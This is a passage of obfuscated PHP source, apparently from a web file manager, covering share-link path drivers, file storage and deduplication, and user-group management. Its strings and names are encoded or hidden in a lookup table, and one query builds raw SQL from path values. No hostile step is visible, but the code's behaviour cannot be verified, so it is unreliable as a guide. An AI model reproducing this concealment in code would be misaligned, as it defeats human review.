$¶ä‰”ˆ = substr($á’¥‹, strlen($‘»ÄÆÇ)); if (substr($á’¥‹, 0, strlen($‘»ÄÆÇ)) != $‘»ÄÆÇ) { return !1; } return $this->pathParse[$‡ãÑÖøå[1251]] . $‡ãÑÖøå[8] . ltrim($¶ä‰”ˆ, $‡ãÑÖøå[8]); } public function getType() { $ã³€Î´í =& $_SERVER[¦»×‡Ãã]; $û¼á×åõ = str_replace($ã³€Î´í[77], $ã³€Î´í[12], get_class($this)); return strtolower($û¼á×åõ); } public function isOsDriver($ÂÔ¹¨‰¯) { return IO::isOsDriver($ÂÔ¹¨‰¯); } public function info($—ÒªéÔ™) { return $this->infoParse($—ÒªéÔ™); } public function infoAuth($üëÔæ‚Î) { return $this->infoParse($üëÔæ‚Î); } public function infoWithChildren($–˜¥ßÁ¬) { return $this->infoParse($–˜¥ßÁ¬, !0); } public function infoFull($–€ˆÖ¥) { return $this->infoParse($–€ˆÖ¥); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ßœ§ÙÔË) { $this->pathParse = $ßœ§ÙÔË; } protected function infoParse($üé–Ö¿ô, $ºŸÓßşË = false) { $Ùµ©ÈËÎ =& $_SERVER[¦»×‡Ãã]; return Action($Ùµ©ÈËÎ[1256])->sharePathInfo($this->pathParse[$Ùµ©ÈËÎ[87]], !0, $ºŸÓßşË); } public function listPath($º®òÃ, $Á¸Íö¡‘ = false) { $åççäòá =& $_SERVER[¦»×‡Ãã]; $‡Ø€Ú½ = IO::listPath($º®òÃ, $Á¸Íö¡‘); if (!$‡Ø€Ú½) { return $‡Ø€Ú½; } if (is_array($‡Ø€Ú½[$åççäòá[1428]])) { $ßòÔ€·§ = Action($åççäòá[1437])->parsePathChildren($‡Ø€Ú½[$åççäòá[1428]], array($åççäòá[495] => $º®òÃ)); $‡Ø€Ú½[$åççäòá[1428]] = Action($åççäòá[1256])->shareItemInfo($ßòÔ€·§); } foreach ($‡Ø€Ú½ as $é™´É‚ => $èÂï¯‡ï) { if (!in_array($é™´É‚, array($åççäòá[86], $åççäòá[85]))) { continue; } foreach ($èÂï¯‡ï as $şßô¢ÕÌ => $ßòÔ€·§) { $ßòÔ€·§ = Action($åççäòá[1437])->parsePathChildren($ßòÔ€·§, array($åççäòá[495] => $º®òÃ)); $‡Ø€Ú½[$é™´É‚][$şßô¢ÕÌ] = Action($åççäòá[1256])->shareItemInfo($ßòÔ€·§); } } return $‡Ø€Ú½; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($È¡÷’İ) { parent::__construct($È¡÷’İ); $this->setSignVersion($_SERVER[¦»×‡Ãã][247]); } } goto dÖ”ªÕÉºí; dùÓ‚‚…£ƒ: class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\137\x66\151\154\145\137\x63\157\156\164\145\x6e\164\163"; protected $dataAuto = array(array("\x63\x72\x65\141\164\x65\124\151\155\x65", "\x74\x69\x6d\x65", "\x69\156\x73\x65\162\164", "\x66\x75\x6e\x63\164\151\x6f\156")); } class FileModel extends ModelBase { protected $tableName = "\151\157\x5f\x66\x69\x6c\145"; protected $tableMeta = array("\x74\141\x62\x6c\145\x4e\141\155\x65" => "\151\x6f\x5f\146\151\x6c\145\x5f\155\145\164\x61", "\155\145\164\x61\x46\151\145\x6c\144" => "\146\x69\154\145\111\x44"); public function fileInfo($­á°ò¥Â) { $İ–«ÊÖ =& $_SERVER[¦»×‡Ãã]; static $¬’ã˜…´ = array(); if (!isset($¬’ã˜…´[$­á°ò¥Â])) { $ËÁçßÍÏ = $İ–«ÊÖ[2021]; $È¢–Š³ = Model($İ–«ÊÖ[544])->field($ËÁçßÍÏ)->where(array($İ–«ÊÖ[542] => $­á°ò¥Â))->find(); $¬’ã˜…´[$­á°ò¥Â] = $È¢–Š³; } return $¬’ã˜…´[$­á°ò¥Â]; } public function addFileByContent($§¸›˜² = '', $èäğ´½— = '') { $ÜùÚåö× =& $_SERVER[¦»×‡Ãã]; $·Ø²€¼ = TEMP_PATH . $ÜùÚåö×[2022]; if (!is_dir($·Ø²€¼)) { mk_dir($·Ø²€¼); } $Ÿ òÚ” = $·Ø²€¼ . $ÜùÚåö×[2023] . rand_string(16); file_put_contents($Ÿ òÚ”, $§¸›˜²); $Ğ…üÉ¥© = $this->addFile($Ÿ òÚ”, $èäğ´½—, !0); if (file_exists($Ÿ òÚ”)) { @unlink($Ÿ òÚ”); } return $Ğ…üÉ¥©; } public function createFileName($‚ªâ ó‚, $äÆµ…â = false, $ĞÁæİÓ’ = false) { $ü¥ÑĞºÙ =& $_SERVER[¦»×‡Ãã]; $äœÊò›É = IO::init($ü¥ÑĞºÙ[8]); $ÍêË×É„ = $this->makeFilePath($‚ªâ ó‚, $äœÊò›É, $äÆµ…â, $ĞÁæİÓ’); $Ûè„Æ¸ = $äœÊò›É->pathFather($ÍêË×É„); static $ñÃ°£Ï¡ = false; $„²“æ®± = $ü¥ÑĞºÙ[2024] . md5($Ûè„Æ¸); if (!$ñÃ°£Ï¡ && !Cache::get($„²“æ®±)) { $ñÃ°£Ï¡ = !0; $Âµ±À— = IO::mkdir($Ûè„Æ¸); if (!IO::exist($Âµ±À— . $ü¥ÑĞºÙ[870])) { IO::mkfile($Âµ±À— . $ü¥ÑĞºÙ[870]); } Cache::set($„²“æ®±, 1, 3600 * 2); } return $ÍêË×É„; } public function makeFilePath($Ğ†×ãşÇ, $áÜ¡¦åõ, $Œ„ñÅ·ë = false, $£€ÆŠ¶ = false) { $±Á±©Æš =& $_SERVER[¦»×‡Ãã]; $Ú­·áƒß = Model($±Á±©Æš[843])->get($±Á±©Æš[2025]); $ŒØŠÈõÚ = KodIO::defaultIO() . date($±Á±©Æš[2026]); $úëİµï’ = $ŒØŠÈõÚ . rand_string(5) . short_id(100); $Ğ†×ãşÇ = str_replace($±Á±©Æš[8], $±Á±©Æš[11], KodIO::clear($Ğ†×ãşÇ)); $Òª€¼Ûœ = $áÜ¡¦åõ->ext($Ğ†×ãşÇ); if (!$Ğ†×ãşÇ) { $Ú­·áƒß = $±Á±©Æš[849]; } switch ($Ú­·áƒß) { case $±Á±©Æš[2027]: if ($Òª€¼Ûœ) { $úëİµï’ = $úëİµï’ . $±Á±©Æš[10] . $Òª€¼Ûœ; } if ($Òª€¼Ûœ == $±Á±©Æš[1963]) { $úëİµï’ .= $±Á±©Æš[1291]; } break; case $±Á±©Æš[2028]: $åÓ˜¥ÁŸ = Model($±Á±©Æš[843])->get($±Á±©Æš[844]); $¿¿ƒº¦ = substr(md5($±Á±©Æš[845] . $åÓ˜¥ÁŸ . date($±Á±©Æš[822])), 0, 8); $‰ÍœÒ÷æ = KodIO::defaultDriver(); $ŒØŠÈõÚ = $±Á±©Æš[1322] . $‰ÍœÒ÷æ[$±Á±©Æš[475]] . $±Á±©Æš[484] . date($±Á±©Æš[2029]) . $¿¿ƒº¦ . $±Á±©Æš[8]; if ($Òª€¼Ûœ == $±Á±©Æš[1963]) { $Ğ†×ãşÇ .= $±Á±©Æš[1291]; } $û‰’Ù¤Š = $±Á±©Æš[2030] . $ŒØŠÈõÚ . $Ğ†×ãşÇ; CacheLock::lock($û‰’Ù¤Š); $úëİµï’ = $ŒØŠÈõÚ . $Ğ†×ãşÇ; if (IO::exist($ŒØŠÈõÚ . $Ğ†×ãşÇ)) { $®öáÂ‡ = substr($Ğ†×ãşÇ, 0, strlen($Ğ†×ãşÇ) - strlen($Òª€¼Ûœ)); $Ù£ü»Äƒ = $£€ÆŠ¶ ? substr($£€ÆŠ¶, 0, 5) : ($Œ„ñÅ·ë ? substr($Œ„ñÅ·ë, 0, 5) : rand_string(5)); $úëİµï’ = $ŒØŠÈõÚ . $®öáÂ‡ . $Ù£ü»Äƒ; if ($Òª€¼Ûœ) { $úëİµï’ = $úëİµï’ . $±Á±©Æš[10] . $Òª€¼Ûœ; } } if (IO::isOsDriver($úëİµï’) && !IO::isUploadServer($úëİµï’)) { if (IO::exist($úëİµï’)) { return $úëİµï’; } $‰ñÄæº = IO::setContent($úëİµï’, $±Á±©Æš[12]); if (!$‰ñÄæº) { show_json($±Á±©Æš[2031], !1); } } CacheLock::unlock($û‰’Ù¤Š); break; case $±Á±©Æš[849]: break; default: break; } return $úëİµï’; } public function addFileByRemote($ùìÔ±ĞÄ, $õóÛ´­û, $ì¸¿û«… = array()) { $´òü‘ƒà =& $_SERVER[¦»×‡Ãã]; if (!IO::exist($ùìÔ±ĞÄ)) { return !1; } $¤¹¨©şµ = $ì¸¿û«…[$´òü‘ƒà[547]] ? $ì¸¿û«…[$´òü‘ƒà[547]] : $´òü‘ƒà[12]; $–èƒö¦Ï = IO::hashMd5($ùìÔ±ĞÄ, $¤¹¨©şµ); $ÄÏÍ½ = KodIO::defaultDriver(); $É¤ë×¨§ = array($´òü‘ƒà[617] => IO::size($ùìÔ±ĞÄ), $´òü‘ƒà[2032] => 1, $´òü‘ƒà[494] => $õóÛ´­û, $´òü‘ƒà[881] => $ÄÏÍ½[$´òü‘ƒà[475]], $´òü‘ƒà[495] => $ùìÔ±ĞÄ, $´òü‘ƒà[2033] => $ì¸¿û«…[$´òü‘ƒà[672]] ? $ì¸¿û«…[$´òü‘ƒà[672]] : IO::hashSimple($ùìÔ±ĞÄ), $´òü‘ƒà[2034] => $–èƒö¦Ï ? $–èƒö¦Ï : $¤¹¨©şµ); if ($Í ÀÂÀå = $this->addFileCheckExist($É¤ë×¨§[$´òü‘ƒà[672]], $É¤ë×¨§[$´òü‘ƒà[547]], $É¤ë×¨§[$´òü‘ƒà[79]])) { return $Í ÀÂÀå; } return $this->addFileData($É¤ë×¨§); } private function addFileData($Â¢ÃÊÂİ) { $¾¤Å¸Ş³ =& $_SERVER[¦»×‡Ãã]; if (!$Â¢ÃÊÂİ) { return !1; } $Â¢ÃÊÂİ[$¾¤Å¸Ş³[79]] = intval($Â¢ÃÊÂİ[$¾¤Å¸Ş³[79]]); if (!$Â¢ÃÊÂİ[$¾¤Å¸Ş³[79]] && strlen($Â¢ÃÊÂİ[$¾¤Å¸Ş³[672]]) > 32) { $Â¢ÃÊÂİ[$¾¤Å¸Ş³[79]] = intval(substr($Â¢ÃÊÂİ[$¾¤Å¸Ş³[672]], 32)); } $¾Ñà«ç— = $this->add($Â¢ÃÊÂİ); return $this->find($¾Ñà«ç—); } public function addFile($ÁÀÇÎ€Š, $‘Å“ôÓ, $ºŒŠÓñø = false) { $å‰æ­¬î =& $_SERVER[¦»×‡Ãã]; $„Úîş½Ï = IO::hashSimple($ÁÀÇÎ€Š); $È»  = IO::size($ÁÀÇÎ€Š); $Œë¼ÄÖ = $È»  <= 1024 * 1024 * 10 ? IO::hashMd5($ÁÀÇÎ€Š) : $å‰æ­¬î[12]; $ãßÅ£ìÀ = $å‰æ­¬î[2035] . $„Úîş½Ï; CacheLock::lock($ãßÅ£ìÀ); if ($Œë¼ÄÖ && $„Úîş½Ï) { $ºŸĞı® = $this->addFileCheckExist($„Úîş½Ï, $Œë¼ÄÖ, $È» ); if ($ºŸĞı®) { CacheLock::unlock($ãßÅ£ìÀ); return $ºŸĞı®; } } $ß¶ø½¡ø = $this->addFileMake($ÁÀÇÎ€Š, $È» , $„Úîş½Ï, $Œë¼ÄÖ, $‘Å“ôÓ, $ºŒŠÓñø); $ä»óšÛ = $this->addFileData($ß¶ø½¡ø); CacheLock::unlock($ãßÅ£ìÀ); if (!$Œë¼ÄÖ && $ä»óšÛ) { $this->fileMd5Check($ä»óšÛ); } return $ä»óšÛ; } public function fileMd5Check($ö ÅèÈ¡) { $ŒŸ—»ÙÅ =& $_SERVER[¦»×‡Ãã]; $äŒ¼Ö²‡ = array($ö ÅèÈ¡[$ŒŸ—»ÙÅ[541]], $ö ÅèÈ¡[$ŒŸ—»ÙÅ[87]]); $‹î–¬¤ö = $ŒŸ—»ÙÅ[2036] . $ö ÅèÈ¡[$ŒŸ—»ÙÅ[87]]; $ ÑØ“ê = $ŒŸ—»ÙÅ[2037] . $ö ÅèÈ¡[$ŒŸ—»ÙÅ[541]]; TaskQueue::add($ŒŸ—»ÙÅ[2038], $äŒ¼Ö²‡, $‹î–¬¤ö, $ ÑØ“ê); } public function fileMd5Set($Œ±”ı¶‘, $ÍÜŠ÷œÌ) { $ˆöĞÃõÆ =& $_SERVER[¦»×‡Ãã]; $«×§Ïû = $this->find($Œ±”ı¶‘); if (!$«×§Ïû || $«×§Ïû[$ˆöĞÃõÆ[547]]) { return; } $Ğ—Ÿúì§ = IO::hashMd5($ÍÜŠ÷œÌ); if (!$Ğ—Ÿúì§) { return $ˆöĞÃõÆ[12]; } $this->where(array($ˆöĞÃõÆ[541] => $Œ±”ı¶‘))->save(array($ˆöĞÃõÆ[547] => $Ğ—Ÿúì§)); } public function addFileMake($ùÇ¢¸±­, $¹‚£¾ÍÇ, $èÔ³ñßê, $ù‚ñ‡², $ªÙçÉÅ‘, $òƒêçŞ²) { $õäŠ¿‹¡ =& $_SERVER[¦»×‡Ãã]; $Áôí‘¯ = $this->createFileName($ªÙçÉÅ‘, $èÔ³ñßê, $ù‚ñ‡²); $àöËÂÀ¨ = get_path_father($Áôí‘¯); $ı•ÎùáŸ = get_path_this($Áôí‘¯); if ($òƒêçŞ²) { $­ù§šç° = IO::move($ùÇ¢¸±­, $àöËÂÀ¨, !1, $ı•ÎùáŸ); } else { $­ù§šç° = IO::copy($ùÇ¢¸±­, $àöËÂÀ¨, !1, $ı•ÎùáŸ); } if (!$­ù§šç°) { return !1; } $ö„şş…Á = KodIO::defaultDriver(); $ÚçËÕ– = array($õäŠ¿‹¡[617] => $¹‚£¾ÍÇ, $õäŠ¿‹¡[2032] => 1, $õäŠ¿‹¡[494] => $ªÙçÉÅ‘, $õäŠ¿‹¡[881] => $ö„şş…Á[$õäŠ¿‹¡[475]], $õäŠ¿‹¡[495] => $Áôí‘¯, $õäŠ¿‹¡[2033] => $èÔ³ñßê, $õäŠ¿‹¡[2034] => $ù‚ñ‡²); return $ÚçËÕ–; } public function addFileCheckExist($è‘©úğ¦, $ÀçÅÅÄ‘, $±ˆÚÄ•ö) { $™‹Êç– =& $_SERVER[¦»×‡Ãã]; $şıÕşÁÕ = $this->findByHash($è‘©úğ¦, $ÀçÅÅÄ‘); if (!$şıÕşÁÕ) { return !1; } $ÌÔˆßÒÉ = array($™‹Êç–[2032] => intval($şıÕşÁÕ[$™‹Êç–[2039]]) + 1, $™‹Êç–[617] => $±ˆÚÄ•ö); $this->where(array($™‹Êç–[542] => $şıÕşÁÕ[$™‹Êç–[541]]))->save($ÌÔˆßÒÉ); return $şıÕşÁÕ; } public function remove($ã­ÊúÊÇ) { $this->linkCountChange($ã­ÊúÊÇ, !1); $this->clearEmpty(); return !0; } public function linkAdd($¥•…øà¾) { $this->linkCountChange($¥•…øà¾, !0); } public function linkCountChange($ğîê®®, $˜çĞÆµ) { $‰¦»¾Ä =& $_SERVER[¦»×‡Ãã]; if (!$ğîê®®) { return; } if (!is_array($ğîê®®)) { $ğîê®® = array($ğîê®®); } $¬¹°Ş¾Å = array(); foreach ($ğîê®® as $®îËÌÀÒ) { $ìüğ†ÈÀ = $®îËÌÀÒ . $‰¦»¾Ä[12]; if (!$¬¹°Ş¾Å[$ìüğ†ÈÀ]) { $¬¹°Ş¾Å[$ìüğ†ÈÀ] = 0; } $¬¹°Ş¾Å[$ìüğ†ÈÀ]++; } $áÚ‹ûˆë = array(); foreach ($¬¹°Ş¾Å as $®îËÌÀÒ => $ÄöŒŒ³Ş) { $ìüğ†ÈÀ = $ÄöŒŒ³Ş . $‰¦»¾Ä[12]; if (!$áÚ‹ûˆë[$ìüğ†ÈÀ]) { $áÚ‹ûˆë[$ìüğ†ÈÀ] = array(); } $áÚ‹ûˆë[$ìüğ†ÈÀ][] = $®îËÌÀÒ; } foreach ($áÚ‹ûˆë as $ÄöŒŒ³Ş => $ÔšªóÕÇ) { if (!$ÔšªóÕÇ) { continue; } $ÄöŒŒ³Ş = $˜çĞÆµ ? $ÄöŒŒ³Ş : -intval($ÄöŒŒ³Ş); $¬í¢¦ÑÜ = array($‰¦»¾Ä[541] => array($‰¦»¾Ä[7], $ÔšªóÕÇ)); if ($ÄöŒŒ³Ş < 0) { $¬í¢¦ÑÜ[$‰¦»¾Ä[2039]] = array($‰¦»¾Ä[1093], abs($ÄöŒŒ³Ş)); } $this->where($¬í¢¦ÑÜ)->setAdd($‰¦»¾Ä[2039], $ÄöŒŒ³Ş); } } public function findByHash($ºùàË—Ú, $Ç£ ±†† = false) { $åà£¨àº =& $_SERVER[¦»×‡Ãã]; if (!$ºùàË—Ú && !$Ç£ ±††) { return !1; } $Èüõœ”ğ = array($åà£¨àº[2033] => $ºùàË—Ú); if ($Ç£ ±††) { $Èüõœ”ğ = array($åà£¨àº[2034] => $Ç£ ±††); } return $this->order($åà£¨àº[2040])->where($Èüõœ”ğ)->find(); } public function clearEmpty($Ì™Ö­Ãå = 0) { $ç™ğÎÅ© =& $_SERVER[¦»×‡Ãã]; $íû¯–Ğ = time() - 3600 * 24 * $Ì™Ö­Ãå; $œùÁ–“† = $ç™ğÎÅ©[2041] . $íû¯–Ğ; $ÙØ¿²ÁĞ = $this->where($œùÁ–“†)->select(); if (!$ÙØ¿²ÁĞ) { return; } $—µ‹‹í¤ = new Task($ç™ğÎÅ©[2042], $ç™ğÎÅ©[12], count($ÙØ¿²ÁĞ)); foreach ($ÙØ¿²ÁĞ as $Ò‰‰’Û¥) { $—µ‹‹í¤->update(1); $this->resetFile($Ò‰‰’Û¥); } $—µ‹‹í¤->end(); } public function resetFile($Êºİì…€) { $™¶ã•Şá =& $_SERVER[¦»×‡Ãã]; $Ú±Âòù• = array($™¶ã•Şá[542] => $Êºİì…€[$™¶ã•Şá[541]]); $ÓÙ˜ÂÎÖ = Model($™¶ã•Şá[1420])->where($Ú±Âòù•)->count(); $«‘º£‹Ã = Model($™¶ã•Şá[2043])->where($Ú±Âòù•)->count(); $®«”œ¢ã = intval($ÓÙ˜ÂÎÖ) + intval($«‘º£‹Ã); if ($®«”œ¢ã == 0) { IO::remove($Êºİì…€[$™¶ã•Şá[87]]); Model($™¶ã•Şá[2044])->delete($Êºİì…€[$™¶ã•Şá[541]]); $this->where($Ú±Âòù•)->delete(); $this->metaSet($Êºİì…€[$™¶ã•Şá[541]], null, null); write_log(ACTION . $™¶ã•Şá[2045] . KodUser::id() . $™¶ã•Şá[2046] . $Êºİì…€[$™¶ã•Şá[541]] . $™¶ã•Şá[2047] . $Êºİì…€[$™¶ã•Şá[79]] . $™¶ã•Şá[201] . $Êºİì…€[$™¶ã•Şá[87]], $™¶ã•Şá[2048]); return; } if ($Êºİì…€[$™¶ã•Şá[2039]] != $®«”œ¢ã) { $this->where($Ú±Âòù•)->save(array($™¶ã•Şá[2032] => $®«”œ¢ã)); } } public function storageInfo($ƒ‚üâ›ú = false) { $Åàş¹Õ =& $_SERVER[¦»×‡Ãã]; $åû››î´ = $this->count() + 0.0; $Ãö¦µŸ” = 0; $Æ›‚¥¾ = 1; $àé†¥ö³ = 0; $À¢òÓªÜ = 5000; for ($ÒÎ·å«¢ = 0; $ÒÎ·å«¢ < $åû››î´; $ÒÎ·å«¢ = $ÒÎ·å«¢ + $À¢òÓªÜ) { $”î¾íö“ = $this->limit($ÒÎ·å«¢, $ÒÎ·å«¢ + $À¢òÓªÜ)->select(); foreach ($”î¾íö“ as $«‹€ŒÅ) { $Æ›‚¥¾ += $«‹€ŒÅ[$Åàş¹Õ[79]] * $«‹€ŒÅ[$Åàş¹Õ[2039]]; $Ãö¦µŸ” += $«‹€ŒÅ[$Åàş¹Õ[79]] * ($«‹€ŒÅ[$Åàş¹Õ[2039]] - 1); $àé†¥ö³ += $«‹€ŒÅ[$Åàş¹Õ[2039]]; } } $ÒŸßÜÔ„ = array($Åàş¹Õ[2049] => $Æ›‚¥¾, $Åàş¹Õ[2050] => $Ãö¦µŸ”, $Åàş¹Õ[2051] => $Ãö¦µŸ” / $Æ›‚¥¾, $Åàş¹Õ[83] => $åû››î´, $Åàş¹Õ[2052] => $àé†¥ö³); return $ÒŸßÜÔ„; } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\157\165\160"; protected $tableMeta = array("\x74\x61\142\154\x65\116\x61\x6d\145" => "\x67\162\157\165\x70\137\x6d\x65\x74\x61", "\155\x65\x74\141\106\x69\145\x6c\144" => "\147\162\x6f\165\x70\x49\x44"); protected function cacheFunctionAlias($üâœ¡Ú­) { $¸âÔßƒÊ =& $_SERVER[¦»×‡Ãã]; return array($¸âÔßƒÊ[2053] => array($üâœ¡Ú­[0], $¸âÔßƒÊ[2054]), $¸âÔßƒÊ[2055] => array($üâœ¡Ú­[0], $¸âÔßƒÊ[2056])); } protected function getInfo($”†½Ä£¤, $¸¥ùÖ¤ = false) { $¨éÆï”¸ = $this->getInfoSimple($”†½Ä£¤); if (!$¨éÆï”¸) { return !1; } if ($¸¥ùÖ¤) { return $this->_listDataApplyItem($¨éÆï”¸); } return $this->cacheFunctionGet($_SERVER[¦»×‡Ãã][2057], $”†½Ä£¤); } protected function getInfoSimple($ãÈ¥üğ¦, $ÂüĞ‚Ã = false) { $çƒØ‚èô =& $_SERVER[¦»×‡Ãã]; if ($ÂüĞ‚Ã) { $åÚÑ¿½ = array($çƒØ‚èô[1971] => intval($ãÈ¥üğ¦)); $ŸóÜÌÇ = $this->where($åÚÑ¿½)->find(); return is_array($ŸóÜÌÇ) ? $ŸóÜÌÇ : array(); } return $this->cacheFunctionGet($çƒØ‚èô[2058], $ãÈ¥üğ¦); } protected function groupAdd($áË÷›í) { $ã¤áÓ¹ =& $_SERVER[¦»×‡Ãã]; if (!$áË÷›í[$ã¤áÓ¹[192]] && isset($áË÷›í[$ã¤áÓ¹[1971]]) && $áË÷›í[$ã¤áÓ¹[1971]] == 1) { if ($ÏÂø’Š¬ = $this->getInfoSimple($áË÷›í[$ã¤áÓ¹[1971]], !0)) { return $áË÷›í[$ã¤áÓ¹[1971]]; } } else { $ÏÂø’Š¬ = $this->getInfoSimple($áË÷›í[$ã¤áÓ¹[192]]); if (!$ÏÂø’Š¬) { return !1; } } $³½ˆâ†» = $ã¤áÓ¹[594]; if ($ÏÂø’Š¬[$ã¤áÓ¹[584]]) { $³½ˆâ†» = $ÏÂø’Š¬[$ã¤áÓ¹[584]] . $ÏÂø’Š¬[$ã¤áÓ¹[1971]] . $ã¤áÓ¹[50]; } $íüı´§ = array($ã¤áÓ¹[494] => $this->groupNameAuto($áË÷›í[$ã¤áÓ¹[192]], $áË÷›í[$ã¤áÓ¹[32]]), $ã¤áÓ¹[477] => $áË÷›í[$ã¤áÓ¹[192]], $ã¤áÓ¹[652] => $³½ˆâ†», $ã¤áÓ¹[2059] => $áË÷›í[$ã¤áÓ¹[1957]], $ã¤áÓ¹[2060] => 0, $ã¤áÓ¹[1975] => 0); if (isset($áË÷›í[$ã¤áÓ¹[1995]])) { $íüı´§[$ã¤áÓ¹[1995]] = $áË÷›í[$ã¤áÓ¹[1995]]; } else { $¬—Óá”Æ = $this->max($ã¤áÓ¹[1995]); if (!$¬—Óá”Æ) { $¬—Óá”Æ = 0; } $íüı´§[$ã¤áÓ¹[1995]] = $¬—Óá”Æ + 1; } if (!empty($áË÷›í[$ã¤áÓ¹[1971]])) { $íüı´§[$ã¤áÓ¹[1971]] = $áË÷›í[$ã¤áÓ¹[1971]]; } $²Ó¦”¢ø = $this->add($íüı´§); $this->setNamePinyin($²Ó¦”¢ø, $íüı´§[$ã¤áÓ¹[32]]); if (isset($áË÷›í[$ã¤áÓ¹[2061]])) { $this->metaSet($²Ó¦”¢ø, array($ã¤áÓ¹[2061] => $áË÷›í[$ã¤áÓ¹[2061]], $ã¤áÓ¹[2062] => $áË÷›í[$ã¤áÓ¹[2062]])); unset($áË÷›í[$ã¤áÓ¹[2061]]); unset($áË÷›í[$ã¤áÓ¹[2062]]); } Model($ã¤áÓ¹[1420])->groupRootAdd($²Ó¦”¢ø); $this->_clearCache($áË÷›í[$ã¤áÓ¹[192]]); return $²Ó¦”¢ø; } protected function groupEdit($Şüùƒã˜, $¡µ¹•º) { $ËË²ò¬ñ =& $_SERVER[¦»×‡Ãã]; $””¸Å”¾ = $this->getInfoSimple($Şüùƒã˜); if (!$””¸Å”¾) { return !1; } if (!empty($¡µ¹•º[$ËË²ò¬ñ[192]])) { $±Æ¿î = $this->getInfoSimple($¡µ¹•º[$ËË²ò¬ñ[192]]); if (!$±Æ¿î) { return !1; } if ($””¸Å”¾[$ËË²ò¬ñ[1971]] == $±Æ¿î[$ËË²ò¬ñ[1971]]) { return !1; } if ($¡µ¹•º[$ËË²ò¬ñ[192]] != $””¸Å”¾[$ËË²ò¬ñ[192]]) { if ($±Æ¿î[$ËË²ò¬ñ[584]] !== $””¸Å”¾[$ËË²ò¬ñ[584]] && strpos($±Æ¿î[$ËË²ò¬ñ[584]], $””¸Å”¾[$ËË²ò¬ñ[584]] . $””¸Å”¾[$ËË²ò¬ñ[1971]] . $ËË²ò¬ñ[50]) === 0) { return !1; } $¡µ¹•º[$ËË²ò¬ñ[652]] = $±Æ¿î[$ËË²ò¬ñ[584]] . $¡µ¹•º[$ËË²ò¬ñ[192]] . $ËË²ò¬ñ[50]; $this->_changeChildLevel($””¸Å”¾, $±Æ¿î); $this->_clearCache($±Æ¿î[$ËË²ò¬ñ[1971]]); $this->_clearCache($””¸Å”¾[$ËË²ò¬ñ[192]]); } } if (isset($¡µ¹•º[$ËË²ò¬ñ[32]])) { $this->setNamePinyin($Şüùƒã˜, $¡µ¹•º[$ËË²ò¬ñ[32]]); } if (isset($¡µ¹•º[$ËË²ò¬ñ[2061]])) { $this->metaSet($Şüùƒã˜, array($ËË²ò¬ñ[2061] => $¡µ¹•º[$ËË²ò¬ñ[2061]], $ËË²ò¬ñ[2062] => $¡µ¹•º[$ËË²ò¬ñ[2062]])); unset($¡µ¹•º[$ËË²ò¬ñ[2061]]); unset($¡µ¹•º[$ËË²ò¬ñ[2062]]); } $this->_clearChildrenCache($””¸Å”¾); return $this->where(array($ËË²ò¬ñ[2063] => $Şüùƒã˜))->save($¡µ¹•º); } private function _clearChildrenCache($ÇÇ†¥±¢) { $ÂŞ‹Ñş =& $_SERVER[¦»×‡Ãã]; $÷¨³š¨î = array($ÂŞ‹Ñş[652] => array($ÂŞ‹Ñş[612], $ÇÇ†¥±¢[$ÂŞ‹Ñş[584]] . $ÇÇ†¥±¢[$ÂŞ‹Ñş[1971]] . $ÂŞ‹Ñş[613])); $¢ğµ•Æ = $this->field($ÂŞ‹Ñş[1971])->where($÷¨³š¨î)->select(); foreach ($¢ğµ•Æ as $éß‚–…) { $this->_clearCache($éß‚–…[$ÂŞ‹Ñş[1971]]); } } private function _clearCache($ÁÃğ­’Ó) { $ßç™˜½Ç =& $_SERVER[¦»×‡Ãã]; $this->cacheFunctionClear($ßç™˜½Ç[2057], $ÁÃğ­’Ó); $this->cacheFunctionClear($ßç™˜½Ç[2058], $ÁÃğ­’Ó); } private function _changeChildLevel($¬¥ş’šİ, $×£ÆØÂç, $Šû†À›Û = false) { $©°ÃˆÛõ =& $_SERVER[¦»×‡Ãã]; $²ñ—Ğ…İ = $¬¥ş’šİ[$©°ÃˆÛõ[584]] . $¬¥ş’šİ[$©°ÃˆÛõ[1971]] . $©°ÃˆÛõ[50]; $ßò†›ğ¥ = $×£ÆØÂç[$©°ÃˆÛõ[584]] . $×£ÆØÂç[$©°ÃˆÛõ[1971]] . $©°ÃˆÛõ[50] . $¬¥ş’šİ[$©°ÃˆÛõ[1971]] . $©°ÃˆÛõ[50]; if ($Šû†À›Û) { $ßò†›ğ¥ = $×£ÆØÂç[$©°ÃˆÛõ[584]] . $×£ÆØÂç[$©°ÃˆÛõ[1971]] . $©°ÃˆÛõ[50]; } $ÉšÓ„» = array($©°ÃˆÛõ[652] => array($©°ÃˆÛõ[612], $¬¥ş’šİ[$©°ÃˆÛõ[584]] . $¬¥ş’šİ[$©°ÃˆÛõ[1971]] . $©°ÃˆÛõ[613])); $™¥»Ç = array($©°ÃˆÛõ[652] => array($©°ÃˆÛõ[661], "\x72\x65\160\x6c\141\x63\145\50\160\x61\162\x65\x6e\x74\x4c\x65\166\x65\154\54\x27{$²ñ—Ğ…İ}\x27\x2c\47{$ßò†›ğ¥}\47\51")); $this->_clearChildrenCache($¬¥ş’šİ); $this->where($ÉšÓ„»)->data($™¥»Ç)->save(); } public function setNamePinyin($´™ô›à¤, $ıæ˜€âò = false) { $ª‹Ï´üñ =& $_SERVER[¦»×‡Ãã]; if (!$ıæ˜€âò) { $«„çÙÆÕ = $this->getInfoSimple($´™ô›à¤); $ıæ˜€âò = $«„çÙÆÕ[$ª‹Ï´üñ[32]]; } if (!Input::check($ıæ˜€âò, $ª‹Ï´üñ[655])) { $this->metaSet($´™ô›à¤, $ª‹Ï´üñ[538], null); $this->metaSet($´™ô›à¤, $ª‹Ï´üñ[537], null); return; } $§ø²‚û¬ = array($ª‹Ï´üñ[538] => str_replace($ª‹Ï´üñ[53], $ª‹Ï´üñ[12], Pinyin::get($ıæ˜€âò)), $ª‹Ï´üñ[537] => Pinyin::get($ıæ˜€âò, $ª‹Ï´üñ[656])); $this->metaSet($´™ô›à¤, $§ø²‚û¬); } protected function groupStatus($ ê‹­¾Ù, $«œ®Ş¸ú) { $àğ¢å½ƒ =& $_SERVER[¦»×‡Ãã]; $à‡¯Š®È = $this->getInfoSimple($ ê‹­¾Ù); if (!$à‡¯Š®È) { return !1; } $this->_clearCache($ ê‹­¾Ù); return $this->metaSet($ ê‹­¾Ù, $àğ¢å½ƒ[823], $«œ®Ş¸ú); if ($«œ®Ş¸ú == $àğ¢å½ƒ[91]) { $ŠÌÇã  = 